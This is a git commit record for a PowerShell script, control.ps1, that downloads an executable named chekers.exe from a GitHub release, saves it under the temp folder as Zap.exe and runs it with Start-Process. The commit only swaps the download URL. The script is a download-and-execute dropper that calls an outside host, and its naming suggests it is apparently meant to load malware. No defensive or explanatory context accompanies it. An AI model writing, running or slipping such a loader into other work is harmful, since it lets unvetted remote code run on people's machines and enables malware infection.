394cf961912fded33ee64a0098511ad24790245b
kilordow <petrovolosuk310@gmail.com>
2026-02-25 22:26:00 +0200

    Update script to download and execute chekers.exe

--- control.ps1
+++ control.ps1
@@ -1,3 +1,4 @@
 $p="$env:TEMP\Zap.exe"
-iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
+iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe -o $p
 Start-Process $p
+
